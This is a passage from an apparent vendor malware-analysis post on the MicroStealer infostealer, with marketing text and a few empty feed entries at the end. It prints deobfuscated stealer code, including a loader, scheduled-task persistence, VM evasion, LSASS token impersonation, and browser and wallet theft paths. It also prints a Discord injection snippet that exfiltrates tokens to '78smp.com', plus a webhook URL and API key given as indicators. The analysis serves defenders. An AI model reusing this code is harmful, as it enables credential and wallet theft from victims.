+})(); As we can see, all strings are combined and compressed using the  library into a single sequence of Unicode characters, stored in the variable  (for example, “ɡⱃ¼ǀ⼡砫⁮\ư෠祘ഀΠ䌡渡洀…”).To restore them, the malware uses the  method: rwLytg.tuWPH66 = cIb9x8P.decompressFromUTF16(rwLytg.DDXChP); This means that the value stored in DDXChP is the result of . The obfuscator may reference the library under a different name, such as cIb9x8P, but the logic remains the same: the original string data is reconstructed from the compressed sequence.After decompression, the resulting string is split using the : Tky9na.rwLytg.zxxO0HE = tuWPH66.split(“|”); A specific string is then retrieved by index through a : wa4Ibtk = function (mjAYxpv) { 
+    return zxxO0HE[mjAYxpv]; 
+}; Later, the malware references these strings through calls such as , , and , where the argument represents an index in the  array.After removing the unnecessary junk code, this logic can be represented in the following simplified form: GetString; 
+( InitializeStringTable() { 
+ compressed = "ɡⱃ¼ǀ⼡砫⁮\\ư෠祘ഀΠ䌡渡洀 (...truncated)"; 
+ decompressed = lzObject.decompressFromUTF16(compressed); 
+ 
+stringTable = decompressed.split("|"); 
+GetString =  (index) { 
+ stringTable[index]; 
+}; 
+})(); Next, we copy the  implementation from the target script and run the resulting function in a separate script. This makes it possible to extract all strings used by the program. Since the total number of recovered strings is quite large, only some of the most interesting examples are shown below, along with their indices.Note that many strings are truncated and concatenated directly in the code. Their full values are provided in parentheses:[2]  spawn 
+[3]  exec 
+[59] env 
+ 
+[11-25] 
+    try { 
+        Start-Process -FilePath " -ArgumentList '--install' -Verb RunAs 
+        Stop-Process -Id 
+        exit 0 
+    } catch { 
+        exit 1 
+    } 
+ 
+[35-41] powershell -ExecutionPolicy Bypass -NoProfile -NonInteractive -File " 
+ 
+[27]    tmpdir 
+[32-34] writeF + ileSyn (writeFileSync) 
+[54-55] unlink + Sync (unlinkSync) 
+[79]    exists 
+[107-108] readFi + leSync (readFileSync) 
+ 
+[60-65] LOCALA + PPDATA → USERPR + OFILE → AppDat + a + Local (LOCALAPPDATA / USERPROFILE / AppData\Local) 
+[66]    soft.j (soft.jar) 
+[67]    model 
+[68]    jre 
+[69]    bin 
+[70-71] miicro + soft.e (miicrosoft.exe) 
+[73-74] resour + cesPat (resourcesPath) 
+[76-78] app.as + ar.unp + acked (app.asar.unpacked) 
+[81-82] model. + zip (model.zip) 
+ 
+[128]   -jar 
+[129-132] detach (detached), stdio, ignore, unref 
+[140-141] --inst + all (--install) Let us now examine the obfuscated code fragments that implement the logic for launching the , which is distributed in  mjAYxpv = [0, , 32, 2, 1, 256, 6, 3, 8, 16, 4, "undefined", "LZString", "=", " ", ";", "\\\\", 15, 30, "\"", !1, !0,  0, 26, 59, 10, 73, 74, "h", 55, 66,"ar", 79, 1023, 65536, 55296, 56320, 63, 31, 12, 18, 7, 128, 192, "e", 91, 92, 93, 255, 224, 240, 97, 98, 99, 100, "d", 33, "c", ")", 106, 107, 108, "g", 24, 60, 1000]; 
+ 
+     Tky9na = require("fs"), 
+    _LLSkL = require("path"), 
+    { 
+        [wa4Ibtk(mjAYxpv[3])]: E5NpXn, 
+        [wa4Ibtk(mjAYxpv[7])]: TD4p2BE 
+    } = require("child_process"), 
+    peB9yJ = require("os"), 
+    OnZdH7B = require("adm-zip"); 
+ 
+     JbBfOsP = process[wa4Ibtk(mjAYxpv[24])][wa4Ibtk(mjAYxpv[64]) + wa4Ib(61)] || _LLSkL[wa4Ibtk(mjAYxpv[23])](process[wa4Ibtk(mjAYxpv[24])][wa4Ibtk(62) +wa4Ibtk(mjAYxpv[37])], wa4Ibtk(64) + "a", wa4Ibtk(65)), 
+        TD4p2BE = _LLSkL[wa4Ibtk(mjAYxpv[23])](JbBfOsP, wa4Ibtk(mjAYxpv[30]) + mjAYxpv[31]), 
+        peB9yJ = _LLSkL[wa4Ibtk(mjAYxpv[23])](JbBfOsP, wa4Ibtk(67), wa4Ibtk(68), wa4Ibtk(69), wa4Ibtk(70) + wa4Ibtk(71) + "xe"); 
+ 
+     vWOBncd = E5NpXn(peB9yJ, [wa4Ibtk(mjAYxpv[42]), TD4p2BE], { 
+        [wa4Ibtk(129) + "ed"]: mjAYxpv[21], 
+        [wa4Ibtk(130)]: wa4Ibtk(131), 
+        [wa4Ibtk(mjAYxpv[24])]: process[wa4Ibtk(mjAYxpv[24])] 
+    }); 
+    vWOBncd[wa4Ibtk(132)](); 
+    process[wa4Ibtk(mjAYxpv[59])](mjAYxpv[0]) After removing the junk code and substituting the resolved strings, this logic can be represented in the following much more readable form: const fs = require("fs"); 
+const path = require("path"); 
+const { spawn, exec } = require("child_process"); 
+const os = require("os"); 
+const AdmZip = require("adm-zip"); 
+ 
+const baseDir = 
+    process.env.LOCALAPPDATA || 
+    path.join(process.env.USERPROFILE, "AppData", "Local"); 
+ 
+const jarPath = path.join(baseDir, "soft.jar"); 
+ 
+const javaExePath = path.join( 
+    baseDir, 
+    "model", 
+    "jre", 
+    "bin", 
+    "miicrosoft.exe" 
+); 
+ 
+const child = spawn( 
+    javaExePath, 
+    ["-jar", jarPath], 
+    { 
+        detached: true, 
+        stdio: "ignore", 
+        env: process.env 
+    } 
+); 
+ 
+child.unref(); 
+ 
+process.exit(0); The malware then extracts an embedded JRE, disguises the executable as miicrosoft.exe, launches the JAR file in the background, and immediately terminates the main Node.js process, allowing the payload to continue running independently.
+Confirm real attacker activity faster
+Prevent suspicious files from 
+Contact us 
+Breaking Down the Execution Chain As part of its execution chain, the malware also attempts to obtain elevated privileges. This stage is not analyzed in detail here, as it relies primarily on social engineering: the victim is simply presented with a UAC prompt that is likely to be perceived as a normal part of the installation process. The PowerShell script used for this step is shown below: try { 
+    Start-Process -FilePath "Game Launcher.exe" -ArgumentList '--install' -Verb RunAs 
+    Stop-Process -Id (pid) 
+    exit 0 
+} catch { 
+    exit 1 
+} At this stage, the role of  becomes clear. The presence of the  directory containing an  and a  indicates the use of . Analysis in  confirms this: a modal window prompts to load , and both the strings and the entry point contain characteristic .Ultimately,  is an  used as part of the malware delivery chain. The execution flow is as follows: An archive installer containing the malicious payload Electron (Game Launcher.exe): Requests administrator privileges through UAC Electron (Game Launcher.exe –install): Extracts and launches the JAR file Java (miicrosoft.exe -jar soft.jar): Executes the main malicious logic The combination of an NSIS installer and Electron significantly complicates the static analysis of the malware. Electron can directly read and execute JavaScript code from an ASAR archive without extracting it to the file system, bypassing traditional signature-based detection mechanisms. At the same time, the NSIS installer ensures that the malicious files remain unavailable for analysis or detection until the installer itself finishes execution. Static Analysis of the Java Module The next step is to analyze the main module by loading the  into a . Once again, we encounter  this time on the  side. As with the Node.js component, the strings are  and recovered through . A representative fragment is shown below:private static void lambda$checkEnvironment$1(String str) throws Exception { 
+    int iD = a.d(); 
+    String[] strArr = new String[a(0x5e23, 0x6709cb2b9951dedeL)]; 
+    strArr[0] = a((int) 0xfffff707, (int) 0xfffff6e2); 
+    strArr[1] = a((int) 0xfffff636, (int) 0xffff90f5); 
+    strArr[2] = a((int) 0xfffff6c2, (int) 0xfffff530); 
+     
+    // ... 
+ 
+    ?? AnyMatch = iD; 
+    AnyMatch = Arrays.asList(strArr).stream().anyMatch((v1) -> { 
+        return lambda$null$0(r1, v1); 
+    }); 
+} After identifying this characteristic pattern, we examined the header of the .class file to look for traces of the obfuscator in use, and immediately found ZKM (Zelix KlassMaster) v21.0.0.There are already several effective public deobfuscators available for this version of . In this case,  was used with a set of ZKM-focused modules, including string deobfuscation, access restoration, flow deobfuscation, and several additional modules for . After successful deobfuscation, the analysis proceeded to the malware’s core functionality.Overview of MicroStealer Capabilities After deobfuscation, the code became significantly more readable, although not entirely; some parts of the logic still remain convoluted. Even so, the core functionality of MicroStealer is already open to analysis. Let us look at its modules in more detail:Persistence is implemented through the : private void a() throws InterruptedException, IOException { 
+    String string = System.getenv("LOCALAPPDATA"); 
+    string = System.getProperty("user.home") + "\\AppData\\Local"; 
+    String string2 = string + "\\model\\jre\\bin\\miicrosoft.exe"; 
+    String string3 = string + "\\soft.jar"; 
+    String string4 = System.getProperty("user.name"); 
+    String string5 = "App_" + string4; 
+    String string6 = String.format("schtasks /create /tn \"%s\" /tr \"\\\"%s\\\" -jar \\\"%s\\\"\" /sc ONLOGON /delay 0000:05 /rl HIGHEST /f", string5, string2, string3); 
+    Process process = Runtime.getRuntime().exec(string6); 
+    process.waitFor(); 
+} The command creates a task in  with the  (executed when the user logs in), a , and highest privileges (HIGHEST). As a result, the malwareautomatically resumes operation even after the system is rebooted. Virtual Machine Detection MicroStealer checks the execution environment for processes and services typically associated with . If at least one match is found, execution is terminated immediately.Despite these anti-analysis checks, the sample executes successfully in the , allowing its behavior to be fully exposed during analysis.
+Stop paying for incidents that  that bypass traditional security controls
+    
+
+Integrate in your SOC
+This makes it possible to observe the malware’s logic in action and extract valuable for further detection and threat hunting. private static void checkEnvironment(String str) throws Exception { 
+    String[] strArr = new String[13]; 
+    strArr[0]  = "vmwaretray"; 
+    strArr[1]  = "vmwareuser"; 
+    strArr[2]  = "vgauthservice"; 
+    strArr[3]  = "vmacthlp"; 
+    strArr[4]  = "vmsrvc"; 
+    strArr[5]  = "vmusrvc"; 
+    strArr[6]  = "vmtoolsd"; 
+    strArr[7]  = "vboxservice"; 
+    strArr[8]  = "vboxtray"; 
+    strArr[9]  = "qemu-ga"; 
+    strArr[10] = "xenservice"; 
+    strArr[11] = "prl_cc"; 
+    strArr[12] = "prl_tools"; 
+ 
+    boolean anyMatch = Arrays.asList(strArr) 
+        .stream() 
+        .anyMatch(v1 -> str.toLowerCase().contains(v1)); 
+ 
+    if (anyMatch) { 
+        Runtime.getRuntime().halt(0); 
+    } 
+} MicroStealer supports a wide range of , as well as  and . For each detected browser, it accesses the user’s profile data and then extracts protected information using .put("Chrome", localAppData + "\\Google\\Chrome\\User Data"); 
+put("Brave", localAppData + "\\BraveSoftware\\Brave-Browser\\User Data"); 
+put("Edge", localAppData + "\\Microsoft\\Edge\\User Data"); 
+put("Vivaldi", localAppData + "\\Vivaldi\\User Data"); 
+put("Yandex", localAppData + "\\Yandex\\YandexBrowser\\User Data"); 
+put("Chromium", localAppData + "\\Chromium\\User Data"); 
+ 
+ 
+put("Opera", appData + "\\Opera Software\\Opera Stable"); 
+put("Opera GX", appData + "\\Opera Software\\Opera GX Stable"); When  is disabled (), the malware attempts to obtain elevated privileges by interacting with the  process. It enables , searches for  in the process list, and then duplicates its security token and impersonates the token in the current thread:Advapi32Util.registryGetIntValue(HKEY_LOCAL_MACHINE,  
+    "SYSTEM\\CurrentControlSet\\Control\\Lsa", "RunAsPPL"); 
+ 
+af.INSTANCE.RtlAdjustPrivilege(SeDebugPrivilege, true, false, intByReference); 
+ 
+WinNT.HANDLE snapshot = Kernel32.INSTANCE.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); 
+while (Kernel32.INSTANCE.Process32Next(snapshot, processEntry)) { 
+    if ("lsass.exe".equalsIgnoreCase(Native.toString(processEntry.szExeFile))) { 
+        HANDLE hProcess = Kernel32.INSTANCE.OpenProcess(PROCESS_QUERY_INFORMATION, false, processEntry.th32ProcessID); 
+         
+        Advapi32.INSTANCE.OpenProcessToken(hProcess, TOKEN_DUPLICATE, tokenHandle); 
+        Advapi32.INSTANCE.DuplicateToken(tokenHandle.getValue(), SecurityImpersonation, duplicatedToken); 
+        Advapi32.INSTANCE.ImpersonateLoggedOnUser(duplicatedToken.getValue()); 
+        break; 
+    } 
+} The malware captures the user’s current screen using . The resulting image is saved in  and then packaged into a  for later exfiltration.Robot robot = new Robot(); 
+Rectangle screen = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()); 
+BufferedImage screenshot = robot.createScreenCapture(screen); 
+ImageIO.write(screenshot, "png", new File("screenshot.png")); Additional MicroStealer Functionality MicroStealer targets both browser-based cryptocurrency wallet extensions (via ) and desktop wallet applications. The wallet files are copied in full, without any additional processing.put("Metamask", "\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn"); 
+put("Phantom", "\\Local Extension Settings\\bfnaelmomeimhlpmgjnjophhpkkoljpa"); 
+put("Trust Wallet", "\\Local Extension Settings\\egjidjbpglichdcondbcbdnbeeppgdph"); 
+put("Coinbase", "\\Local Extension Settings\\hnfanknocfeofbddgcijnmhnfnkdnaad"); 
+ 
+ 
+put("Exodus", appData + "\\Exodus\\exodus.wallet"); 
+put("Electrum", appData + "\\Electrum\\wallets"); 
+put("AtomicWallet", appData + "\\atomic\\Local Storage\\leveldb"); 
+put("Ethereum", appData + "\\Ethereum\\keystore"); 
+put("Jaxx", appData + "\\com.liberty.jaxx\\IndexedDB\\file__0.indexeddb.leveldb"); 
+JavaScript code is injected into the Discord desktop application, using  to access internal client modules and the Chrome DevTools Protocol (CDP) to intercept network requests and monitor user activity.  { session, BrowserWindow } = require('electron'); 
+ C = { webhook: { url: 'https://78smp.com/m/' } }; 
+ 
+// token extraction from webpack 
+window.webpackChunkdiscord_app.push([ 
+    [Math.random()], {}, 
+    (r)  { 
+         ( mid  r.c) { 
+             getToken = r.c[mid]?.exports?.default?.getToken; 
+             ( getToken === 'function')  getToken(); 
+        } 
+    } 
+]); 
+ 
+// CDP-based network interception 
+w.webContents.debugger.attach('1.3'); 
+w.webContents.debugger.on('message',  (_, m, p)  { 
+    // /auth/login, /mfa/totp, /users/@me// exfiltration to Discord webhook 
+}); The malware intercepts events related to logins, credential changes, 2FA enablement, and the addition of payment methods such as Stripe and Braintree/PayPal. In addition, it collects account metadata such as badges, Nitro level, and similar attributes, which may indicate an attempt to profile victims.The malware also collects information about the victim’s . Using a hardcoded API key, the stealer queries the Steam Web API to retrieve the profile level, number of owned games, and account creation date. While this information does not provide direct access to the account on its own, it may be used to assess the victim’s value and prioritize targets, similarly to the profiling observed in Discord.String apiKey = "440D7F4D810EF9298D25EDDF37C1F902"; 
+ 
+String levelUrl = String.format( 
+    "https://api.steampowered.com/IPlayerService/GetSteamLevel/v1/?key=%s&steamid=%s", 
+    apiKey, steamId 
+); 
+ 
+String gamesUrl = String.format( 
+    "https://api.steampowered.com/IPlayerService/GetOwnedGames/v1/?key=%s&steamid=%s", 
+    apiKey, steamId 
+); 
+ 
+String summaryUrl = String.format( 
+    "https://api.steampowered.com/ISteamUser/GetPlayerSummaries/v0002/?key=%s&steamids=%s", 
+    apiKey, steamId 
+); Detecting MicroStealer Early: A Practical Investigation Loop MicroStealer highlights a familiar problem for many security teams: new malware families often appear before reliable signatures or threat intelligence become widely available.When that happens, defenders are left with suspicious files, unclear alerts, and limited external context. Without fast verification, attackers can quietly collect credentials, session tokens, and other sensitive data while investigations stall. Early detection depends on how quickly a team can move from uncertain signals to confirmed malicious behavior. 1. Monitoring: Spot Suspicious Infrastructure Early Infostealers often rely on external services and fresh infrastructure for data exfiltration. In the case of MicroStealer, stolen information is transmitted through Discord webhooks and attacker-controlled servers.Monitoring for newly observed infrastructure and suspicious connections can help teams catch early signs of compromise before the malware fully completes its collection and exfiltration stages. ANY.RUN’s Threat Intelligence Feeds continuously surface newly observed indicators based on telemetry and submissions from 15,000+ organizations and 600,000+ security professionals. For SOC teams, this means fewer blind spots in monitoring and earlier visibility into suspicious domains, IPs, and attacker infrastructure.  threat data for your SOCCatch attacks early to 
+Integrate TI Feeds
+2. Triage: Confirm Behavior Instead of Guessing New malware families like MicroStealer often lack clear static signatures or reliable reputation data, which slows down traditional investigation workflows.Instead of relying only on static verdicts, analysts can quickly confirm what a suspicious file actually does by executing it in a controlled environment. NSIS installer delivering the payload Electron loader extracting the JAR moduleJava stealer executing its data collection logic  Attempts to steal browser credentials and wallet data Communication with Discord webhooks and external servers Within minutes, analysts can observe the , extract , and determine whether the sample poses a real threat.For SOC teams, this replaces guesswork with , helping reduce investigation time and avoid unnecessary escalations.rely on ANY.RUN for earlier detection and  response 
+    
+
+Power your SOC now
+3. Threat Hunting: Expand Detection from One Sample Once a stealer like MicroStealer is confirmed, the next step is ensuring it does not appear elsewhere in the environment. Using Threat Intelligence Lookup, analysts can pivot from the initial indicators to discover related infrastructure, connected samples, and similar activity patterns. identify related domains and IP addresses find other samples using the same infrastructure detect variants using the same delivery chain By pivoting across infrastructure and behavior, organizations can transform a single investigation into broader detection coverage across the environment. Conclusion: Faster Clarity Means Lower Risk MicroStealer demonstrates how modern infostealers combine layered delivery chains, heavy obfuscation, and anti-analysis techniques to slow down detection. However, even complex malware becomes manageable when teams can quickly move from uncertain alerts to clear behavioral evidence. By combining early monitoring, fast behavioral triage, and targeted threat hunting, security teams can uncover emerging threats faster, reduce investigation time, and limit the risk of data theft inside corporate environments. ANY.RUN, a leading provider of interactive malware analysis and threat intelligence solutions, fits naturally into modern SOC workflows and supports investigations from initial alert to final containment. It allows teams to safely execute suspicious files and URLs, observe real behavior in an interactive environment, enrich indicators with immediate context through TI Lookup, and continuously monitor emerging infrastructure using Threat Intelligence Feeds. Together, these capabilities help reduce uncertainty, accelerate triage, and limit unnecessary escalations across the SOC. ANY.RUN also meets enterprise security and compliance expectations. The company is SOC 2 Type II certified, reinforcing its commitment to protecting customer data and maintaining strong security controls. Indicators of Compromise (IOCs)   
+                                        RocobeSetup.exe (NSIS Installer)                     
+                                        23A705FA71DA6A9191618AEDC1144C4A                     
+                                        755C21DD36A49086F98C87A172B900E6424F467A                     
+                                        9CF1D4F87D9F2EDF53CE681B59C209F57A805E6157693E784D9D946FC3B17A04                     
+                                        Game Launcher.exe (Electron)                     
+                                        A137BF79A2D5F1C8104AF40EC93E4E66                     
+                                        C83D75BF9F9FDA4E6EF7B2C575BC9D3D82D6590B                     
+                                        05F0C8E89248D3477115D9F62B20CA8A95D925140C727E975AB9F3025A5AD01D                     
+                                        soft.jar (MicroStealerCore)                     
+                                        04EA30CD1B74E2844BE939BD1FFE0084                     
+                                        B7D0F8954BAFAB5E79AE96C07E683C229C9F7B72                     
+                                        DF5E2B824C0FD40323A46019BFBC325F89B5B68697ED3C94B52189CF90E1BEC4                     https[:]//discord[.]com/api/webhooks/1460660027969896695/FQ2nam1vUVDwLbiTZCPen9C53eBMg_qB3-z8pGRtZ3ZerbyflDnzfmJVLpgElxMNfO41 Steam Web API Key: 440D7F4D810EF9298D25EDDF37C1F902 
+                                        T1204.002: User Execution: Malicious File                     
+                                        User runs NSIS installer / Game Launcher                     
+                                        PowerShell script with Start-Process -Verb RunAs for UAC                     
+                                        T1059.003: Windows Command Shell                     
+                                        schtasks used to create ONLOGON task                     
+                                        T1053.005: Scheduled Task/Job: Scheduled Task                     
+                                        Task App_
+                                        TA0004: Privilege Escalation                     
+                                        T1548.002: Abuse Elevation Control Mechanism: Bypass User Account Control                     
+                                        UAC prompt for elevation (social engineering)                     
+                                        T1134.001: Access Token Manipulation: Token Impersonation/Theft                     
+                                        DuplicateToken / ImpersonateLoggedOnUser on LSASS token                     
+                                        T1027: Obfuscated Files or Information                     
+                                        Node.js obfuscation + ZKM in JAR                     
+                                        T1036.005: Masquerading: Match Legitimate Resource Name or Location                     
+                                        miicrosoft.exe, Game Launcher naming                     
+                                        T1497.001: Virtualization/Sandbox Evasion: System Checks                     
+                                        Process list check for VMware, VBox, QEMU, etc.                     
+                                        TA0006: Credential Access                     
+                                        T1555.003: Credentials from Password Stores: Credentials from Web Browsers                     
+                                        Chromium/Opera: passwords, autofill via DPAPI                     
+                                        T1539: Steal Web Session Cookie                     
+                                        Browser cookies extraction (session hijacking)                     
+                                        T1552.001: Unsecured Credentials: Credentials InFiles                     
+                                        Wallet files and browser extension storage                     
+                                        T1003.001: OS Credential Dumping: LSASS Memory                     
+                                        LSASS access when RunAsPPL=0, token duplicate                     
+                                        T1082: System Information Discovery                     
+                                        Collects hostname, OS, username, env vars for exfil report                     
+                                        Screenshot via java.awt.Robot, PNG                     
+                                        T1560.001: Archive Collected Data: Archive via Utility                     
+                                        T1567.004: Exfiltration Over Web Service: Exfiltration Over Webhook                     
+                                        Data sent to Discord/webhook                     
+                                        TA0011: Command and Control                     
+                                        T1071.001: Application Layer Protocol: Web Protocols                     ]]></content:encoded></item><item><title>Alipay (1B+ users) DeepLink+JSBridge Attack Chain: Silent GPS Exfiltration, 6 CVEs (CVSS 9.3)</title><link>https://innora.ai/zfb/</link><author>/u/feng_sg</author><category>netsec</category><pubDate>Thu, 12 Mar 2026 08:26:19 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Netsec mods unnecessarily blocking security News posted by US</title><link>https://www.google.com/search?q=NeuraCyb&amp;amp;sca_esv=f7a79e76d6e111ca&amp;amp;biw=1432&amp;amp;bih=696&amp;amp;sxsrf=ANbL-n7AAM_9u8lMox2_M6p0UCONNjnaCw%3A1773293758586&amp;amp;ei=vlCyadutI8-cseMPnNysqAo&amp;amp;ved=0ahUKEwjbhMCE0pmTAxVPTmwGHRwuC6UQ4dUDCBE&amp;amp;uact=5&amp;amp;oq=NeuraCyb&amp;amp;gs_lp=Egxnd3Mtd2l6LXNlcnAiCE5ldXJhQ3liMgQQIxgnMgQQIxgnMgcQABiABBgNMgcQABiABBgNMgcQABiABBgNMgcQABiABBgNMgcQABiABBgNMgcQABiABBgNMgcQABiABBgNMgcQABiABBgNSJkLUJ0DWOgIcAF4AZABAJgBpwGgAZcFqgEDMC41uAEDyAEA-AEBmAIFoAKOBMICChAAGLADGNYEGEfCAg4QABiwAxjkAhjWBNgBAcICFxAuGLADGLgGGNgCGMgDGNoGGNwG2AEBwgIKEAAYgAQYsQMYDZgDAOIDBRIBMSBAiAYBkAYNugYGCAEQARgJkgcDMS40oAeqJbIHAzAuNLgHhwTCBwMyLTXIBxeACAA&amp;amp;sclient=gws-wiz-serp</link><author>/u/Think-Inspection-291</author><category>netsec</category><pubDate>Thu, 12 Mar 2026 05:36:43 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Forensic analysis of LummaC2 infection unmasks DPRK operative behind Polyfill.io supply chain attack and Gate.us infiltration</title><link>https://www.hudsonrock.com/blog/6262</link><author>/u/Malwarebeasts</author><category>netsec</category><pubDate>Thu, 12 Mar 2026 02:19:47 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[]]></content:encoded></item></channel></rss>
